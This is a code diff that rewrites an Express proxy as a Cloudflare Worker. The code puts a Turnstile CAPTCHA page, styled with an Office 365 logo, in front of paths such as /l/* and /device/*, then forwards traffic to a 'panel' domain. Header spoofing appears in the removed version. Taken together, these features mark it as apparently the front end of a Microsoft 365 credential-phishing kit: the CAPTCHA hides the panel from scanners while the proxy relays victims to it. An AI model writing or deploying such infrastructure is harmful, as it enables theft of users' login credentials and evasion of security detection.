@@ -1,30 +1,75 @@
-const express = require('express');
-const cookieParser = require('cookie-parser');
-const app = express();
-const port = process.env.PORT || 3000;
+export default {
+  async fetch(request) {
+    const url = new URL(request.url);
+    const path = url.pathname;
+    const search = url.search;
 
-// ⚠️ YOUR PANEL DOMAIN (change if different)
-const PANEL_DOMAIN = 'portal42-343.sbs';
+    // Your panel domain (change if needed)
+    const panelDomain = 'portal42-343.sbs';
+    
+    // Your Turnstile site key (the one that works)
+    const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
 
-// ⚠️ YOUR TURNSTILE SITE KEY (the one that works)
-const TURNSTILE_SITEKEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
-
-app.use(express.urlencoded({ extended: true }));
-app.use(express.json());
-app.use(cookieParser());
-
-// ---------- CAPTCHA PAGE (with animated Office 365 logo) ----------
-app.get('/captcha', (req, res) => {
-    // Clean the return path: remove double slashes
-    let returnPath = req.query.return || '/';
-    if (returnPath.startsWith('//')) {
-        returnPath = returnPath.replace(/^\/+/, '/');
-    }
-    if (!returnPath.startsWith('/')) {
-        returnPath = '/' + returnPath;
+    // If the path is /captcha, serve the CAPTCHA page
+    if (path === '/captcha') {
+      const returnPath = search ? new URLSearchParams(search).get('return') || '/' : '/';
+      // Clean the return path
+      const cleanReturn = returnPath.startsWith('/') ? returnPath : '/' + returnPath;
+      return new Response(getCaptchaHTML(SITE_KEY, cleanReturn), {
+        headers: { 'Content-Type': 'text/html; charset=UTF-8' }
+      });
     }
 
-    res.send(`
+    // If the path is /verify-captcha, handle the verification (we'll do client-side redirect, so we can skip server verification)
+    // But we can also do a simple check: if the request has a valid token, we could set a cookie, but it's simpler to redirect immediately.
+    // To keep it simple, the CAPTCHA page will just redirect to the return path upon successful token.
+    // So we don't need a /verify endpoint; the CAPTCHA page does the redirect.
+
+    // For all other paths, proxy to your panel (but only if the user has a cookie or we skip)
+    // We'll skip CAPTCHA for the root and non-l/device paths, but protect /l/* and /device/*
+    // Instead of adding session cookies, we can just show CAPTCHA every time for /l/* and /device/*
+    // We'll detect if the path starts with /l/ or /device/ and redirect to CAPTCHA if no special flag.
+    // Since we have no server-side state, we'll use a simple approach: always show CAPTCHA for these paths.
+    // In the CAPTCHA page, we redirect to the original path after solving.
+
+    const isProtected = path.startsWith('/l/') || path.startsWith('/device/');
+    if (isProtected) {
+      // Redirect to the CAPTCHA page with the return URL
+      const returnUrl = path + search;
+      return Response.redirect(`/captcha?return=${encodeURIComponent(returnUrl)}`, 302);
+    }
+
+    // For other paths (e.g., root, static resources), proxy directly
+    const target = `https://${panelDomain}${path}`;
+    const method = request.method;
+    const headers = new Headers(request.headers);
+    headers.set('Host', panelDomain);
+    const body = request.method !== 'GET' && request.method !== 'HEAD' ? request.body : undefined;
+
+    try {
+      const response = await fetch(target, {
+        method: method,
+        headers: headers,
+        body: body,
+      });
+      const newResponse = new Response(response.body, {
+        status: response.status,
+        statusText: response.statusText,
+        headers: response.headers,
+      });
+      // Add cache-control headers
+      newResponse.headers.set('Cache-Control', 'no-store, no-cache, must-revalidate');
+      newResponse.headers.set('Pragma', 'no-cache');
+      newResponse.headers.set('Expires', '0');
+      return newResponse;
+    } catch (error) {
+      return new Response(`Proxy error: ${error.message}`, { status: 500 });
+    }
+  }
+};
+
+function getCaptchaHTML(siteKey, returnPath) {
+  return `
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -141,7 +186,7 @@ app.get('/captcha', (req, res) => {
 
     function onTurnstileLoad() {
       turnstile.render("#cf-turnstile", {
-        sitekey: "${TURNSTILE_SITEKEY}",
+        sitekey: "${siteKey}",
         theme: "light",
         callback: turnstileCallback,
         "error-callback": turnstileErrorCallback,
@@ -151,76 +196,5 @@ app.get('/captcha', (req, res) => {
   </script>
 </body>
 </html>
-    `);
-});
-
-// ---------- CAPTCHA MIDDLEWARE (currently BYPASSED for testing) ----------
-// Uncomment these lines to enable CAPTCHA protection
-/*
-app.use('/l/*', (req, res) => {
-    const originalUrl = req.originalUrl;
-    const cleanPath = originalUrl.replace(/^\/+/, '/');
-    res.redirect(`/captcha?return=${encodeURIComponent(cleanPath)}`);
-});
-
-app.use('/device/*', (req, res) => {
-    const originalUrl = req.originalUrl;
-    const cleanPath = originalUrl.replace(/^\/+/, '/');
-    res.redirect(`/captcha?return=${encodeURIComponent(cleanPath)}`);
-});
-*/
-
-// ✅ BYPASS: For testing, pass through without CAPTCHA
-app.use('/l/*', (req, res, next) => next());
-app.use('/device/*', (req, res, next) => next());
-
-// ---------- MAIN PROXY (fetches content from your panel) ----------
-app.use('*', async (req, res) => {
-    try {
-        // Build the target URL
-        const targetUrl = new URL(req.originalUrl, `https://${PANEL_DOMAIN}`);
-        
-        // Prepare headers
-        const headers = new Headers(req.headers);
-        headers.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
-        headers.delete('host');
-
-        // Forward real client IP to help with Cloudflare
-        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-        if (clientIp) {
-            headers.set('X-Forwarded-For', clientIp);
-            headers.set('CF-Connecting-IP', clientIp);
-        }
-
-        // Add extra headers that Cloudflare expects
-        headers.set('Accept-Language', 'en-US,en;q=0.9');
-        headers.set('Accept-Encoding', 'gzip, deflate, br');
-        headers.set('Cache-Control', 'no-cache');
-
-        const opts = {
-            method: req.method,
-            headers: headers,
-        };
-        if (req.method !== 'GET' && req.method !== 'HEAD') {
-            opts.body = req.body;
-        }
-
-        // Fetch from your panel
-        const response = await fetch(targetUrl.toString(), opts);
-        const body = await response.text();
-        const contentType = response.headers.get('content-type') || '';
-
-        // Log the response status for debugging (will appear in Render logs)
-        console.log(`Proxy: ${req.originalUrl} -> ${targetUrl.toString()} status: ${response.status}`);
-
-        // Send the response back to the user
-        res.status(response.status).set('Content-Type', contentType).send(body);
-    } catch (e) {
-        console.error('Proxy error:', e);
-        res.status(500).send('Proxy Error: ' + e.message);
-    }
-});
-
-app.listen(port, () => {
-    console.log(`✅ Proxy running on port ${port}`);
-});
+  `;
+}
